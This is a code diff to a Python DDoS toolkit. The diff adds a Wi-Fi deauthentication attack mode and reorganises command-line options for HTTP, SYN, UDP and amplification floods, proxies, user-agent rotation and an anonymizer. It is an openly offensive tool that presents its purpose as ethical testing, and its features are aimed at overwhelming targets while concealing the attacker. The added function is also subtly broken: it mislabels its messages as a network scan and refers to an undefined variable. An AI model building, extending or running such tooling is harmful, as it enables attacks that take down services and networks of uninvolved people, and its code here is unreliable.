@@ -9,10 +9,10 @@
 # Short-Description: DDoS Attack Toolkit
 # Description:       A toolkit designed for simulating various types of Distributed Denial of Service (DDoS) attacks for ethical cybersecurity testing.
 # Author:
-# + LIONMAD <https://github.com/Midohajhouj>
+# ++ LIONMAD <https://github.com/Midohajhouj>
 # Version:           v.1.0
 # License:           MIT License - https://opensource.org/licenses/MIT
-### END INIT INFO ###
+#### END INIT INFO ####
 
 import sys # Install module with pip sys --break-system-packages
 import importlib # Install module with pip importlib --break-system-packages
@@ -100,25 +100,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 4.2.2; Nexus 4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.159 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edge/94.0.992.31",
     "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; AS-KDG) like Gecko",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Edge/79.0.309.71",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
-    "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; AS-KDG) like Gecko",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36 Edge/17.17134",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0",
-    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; AS-KDG) like Gecko",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 Edge/17.17134",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
 ]
 
 HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
@@ -177,13 +158,14 @@ def parse_args():
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(description="DDoS Toolkit Coded By LIONBAD")
     parser.add_argument("-u", "--url", required=False, help="Target URL or IP address")
-    parser.add_argument("-a", "--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood", "ntp-amplification", "memcached-amplification", "smurf", "teardrop"], default="http-flood", help="Type of attack to perform")
-    parser.add_argument("-s", "--scan", action="store_true", help="Perform a network scan using NetScan lib ")
+    parser.add_argument("-a", "--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood", "ntp-amplification", "memcached-amplification", "smurf", "teardrop", "wifi-deauth"], default="http-flood", help="Type of attack to perform")
+    parser.add_argument("-s", "--scan", action="store_true", help="Perform a network scan using NetScan lib")
+    parser.add_argument("--wifi-deauth", action="store_true", help="Perform a Wi-Fi deauthentication attack")
+    parser.add_argument("--anonymizer", choices=["start", "stop"], help="Enable or disable anonymizer for anonymity")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
     parser.add_argument("-r", "--rate-limit", type=int, default=100, help="Rate limit for requests per second")
     parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
     parser.add_argument("-d", "--duration", type=int, default=1500, help="Attack duration (seconds)")
-    parser.add_argument("--anonymizer", choices=["start", "stop"], help="Enable or disable anonymizer for anonymity")
     parser.add_argument("--proxies", help="File containing proxy list")
     parser.add_argument("--headers", help="Custom headers as JSON string")
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
@@ -192,7 +174,7 @@ def parse_args():
     parser.add_argument("-user", "--user-agents", help="File containing custom user-agent strings")
     parser.add_argument("-m", "--multi-target", help="File containing multiple target URLs or IPs")
     return parser.parse_args()
-
+    
 def load_proxies(proxy_file: str):
     """Load proxies from a file."""
     try:
@@ -305,6 +287,39 @@ def compress_payload(data: bytes, compression_type: str = "zlib") -> bytes:
         logger.error(f"Error compressing data: {e}")
         return data  # Return uncompressed data if compression fails
 
+
+def wifi_deauth(mode):
+    """Run the netscan script with enhanced error handling and validation."""
+    try:
+        # Define the main directory for wifideauth
+        wifideauth_path = "/opt/DDoS-Toolkit/assets/wifideauth"
+        
+        # Check if netscan.py exists in the defined directory
+        if not os.path.isfile(wifideauth_path):
+            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
+            return
+
+        # Check if Python3 is installed
+        if not shutil.which("python3"):
+            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
+            return
+
+        # Build the command
+        command = ["python3", wifideauth_path, "wlan0"]
+
+        # Execute the command
+        print(f"{BLUE}[*] Starting network scan on wlan0..{RESET}")
+        subprocess.run(command, check=True)
+
+        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")
+    except subprocess.CalledProcessError as cpe:
+        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
+    except FileNotFoundError as fnf:
+        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
+    except Exception as e:
+        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
+        
+        
 def run_network_scanner(target_ip):
     """Run the netscan script with enhanced error handling and validation."""
     try:
@@ -336,6 +351,7 @@ def run_network_scanner(target_ip):
         print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
     except Exception as e:
         print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
+
 
 def run_anonymizer(mode):
     """Run the anonymizer script with error handling and validation."""
@@ -718,7 +734,7 @@ async def main():
     global args
     args = parse_args()
 
-# Handle signals for graceful exit
+    # Handle signals for graceful exit
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
 
@@ -727,6 +743,12 @@ async def main():
         sys.exit(0)
 
     display_banner()
+
+    # If --wifi-deauth is provided, perform the Wi-Fi deauthentication attack and exit
+    if args.wifi_deauth:
+        print(f"{BLUE}[INFO] Starting Wi-Fi deauthentication attack...{RESET}")
+        wifi_deauth("wlan0")  # Pass the interface name directly
+        exit(0)
 
     # If --anonymizer is provided, start or stop anonymizer and exit
     if args.anonymizer:
